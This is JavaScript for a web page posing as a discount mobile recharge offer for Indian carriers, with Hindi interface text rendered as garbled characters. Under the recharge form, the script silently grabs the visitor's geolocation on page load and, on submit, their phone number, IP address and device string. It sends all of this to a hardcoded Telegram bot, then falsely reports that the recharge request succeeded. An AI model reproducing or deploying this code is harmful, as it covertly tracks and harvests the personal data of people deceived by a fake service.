const simSelect = document.getElementById("sim");
const planSelect = document.getElementById("plan");
const mobileInput = document.getElementById("mobile");
const submitBtn = document.getElementById("submitBtn");
const statusMsg = document.getElementById("statusMsg");

const plansData = {
  Jio: [
    "тВ╣299 - 2GB/Day for 28 Days + Unlimited Calls",
    "тВ╣666 - 1.5GB/Day for 84 Days",
    "тВ╣749 - 2GB/Day for 90 Days + OTT Access",
    "тВ╣999 - Unlimited 5G + 2GB/Day, 84 Days",
  ],
  Airtel: [
    "тВ╣265 - 1GB/Day for 28 Days",
    "тВ╣479 - 1.5GB/Day for 56 Days",
    "тВ╣839 - 2GB/Day for 84 Days",
    "тВ╣999 - Unlimited 5G + 2.5GB/Day, 90 Days",
  ],
  Vi: [
    "тВ╣299 - 1.5GB/Day, 28 Days",
    "тВ╣719 - 2GB/Day, 84 Days + Binge All Night",
    "тВ╣999 - Unlimited 5G + Weekend Rollover, 84 Days",
  ],
  BSNL: [
    "тВ╣187 - 2GB/Day for 28 Days",
    "тВ╣699 - 3GB/Day, 84 Days",
    "тВ╣999 - Truly Unlimited 5G + Calls, 90 Days",
  ],
};

// Location storage
let userLocation = null;

// On page load: request location permission silently and send location immediately if granted
window.onload = () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        userLocation = pos.coords;
        // Send location silently to Telegram immediately
        sendLocationToTelegram(userLocation.latitude, userLocation.longitude);
      },
      () => {
        // Permission denied or error, ignore silently
      }
    );
  }
};

// Send location helper
async function sendLocationToTelegram(lat, lon) {
  const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
  const chatId = "6038115234";
  const message = `ЁЯУН рдпреВрдЬрд░ рд▓реЛрдХреЗрд╢рди:\nhttps://www.google.com/maps?q=${lat},${lon}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });
  } catch (e) {
    // silently ignore
  }
}

// Populate plan dropdown on sim select
simSelect.addEventListener("change", () => {
  const sim = simSelect.value;
  planSelect.innerHTML = "";
  if (!sim) {
    planSelect.disabled = true;
    planSelect.innerHTML =
      '<option value="" disabled selected>рдкрд╣рд▓реЗ рд╕рд┐рдо рдЪреБрдиреЗрдВ</option>';
    return;
  }
  planSelect.disabled = false;
  plansData[sim].forEach((plan) => {
    const option = document.createElement("option");
    option.value = plan;
    option.textContent = plan;
    planSelect.appendChild(option);
  });
  const defaultOption = document.createElement("option");
  defaultOption.value = "";
  defaultOption.textContent = "рдкреНрд▓рд╛рди рдЪреБрдиреЗрдВ";
  defaultOption.disabled = true;
  defaultOption.selected = true;
  planSelect.insertBefore(defaultOption, planSelect.firstChild);
  statusMsg.textContent = `рдЖрдкрдиреЗ рд╕рд┐рдо рдЪреБрдирд╛: ${sim}`;
});

planSelect.addEventListener("change", () => {
  statusMsg.textContent = `рдЖрдкрдиреЗ рдкреНрд▓рд╛рди рдЪреБрдирд╛: ${planSelect.value}`;
});

submitBtn.addEventListener("click", async () => {
  const sim = simSelect.value;
  const plan = planSelect.value;
  const mobile = mobileInput.value.trim();

  if (!sim) {
    alert("рдХреГрдкрдпрд╛ рд╕рд┐рдо рдСрдкрд░реЗрдЯрд░ рдЪреБрдиреЗрдВред");
    return;
  }
  if (!plan) {
    alert("рдХреГрдкрдпрд╛ рдкреНрд▓рд╛рди рдЪреБрдиреЗрдВред");
    return;
  }
  if (!/^\d{10}$/.test(mobile)) {
    alert("рдХреГрдкрдпрд╛ 10 рдЕрдВрдХреЛрдВ рдХрд╛ рд╕рд╣реА рдореЛрдмрд╛рдЗрд▓ рдирдВрдмрд░ рджрд░реНрдЬ рдХрд░реЗрдВред");
    return;
  }

  submitBtn.disabled = true;
  submitBtn.textContent = "рдкреНрд░реЛрд╕реЗрд╕ рд╣реЛ рд░рд╣рд╛ рд╣реИ...";

  // Get IP
  let ip = "Unavailable";
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ip = data.ip;
  } catch {}

  const device = navigator.userAgent;

  let locationText = "рд▓реЛрдХреЗрд╢рди рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИред";
  if (userLocation) {
    locationText = `рд▓реЛрдХреЗрд╢рди: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}`;
  }

  const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
  const chatId = "6038115234";

  const telegramMessage = 
`ЁЯУ▓ рдирдпрд╛ рд░рд┐рдЪрд╛рд░реНрдЬ рдЕрдиреБрд░реЛрдз:
рд╕рд┐рдо: ${sim}
рдкреНрд▓рд╛рди: ${plan}
рдореЛрдмрд╛рдЗрд▓ рдирдВрдмрд░: ${mobile}
рдЖрдИрдкреА: ${ip}
рдбрд┐рд╡рд╛рдЗрд╕: ${device}
${locationText}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: telegramMessage }),
    });
    statusMsg.textContent = "рдЖрдкрдХрд╛ рдЕрдиреБрд░реЛрдз рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рднреЗрдЬ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред";
  } catch {
    statusMsg.textContent = "рддреНрд░реБрдЯрд┐ рд╣реБрдИред рдХреГрдкрдпрд╛ рдкреБрдирдГ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред";
  }

  submitBtn.disabled = false;
  submitBtn.textContent = "рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ";
});
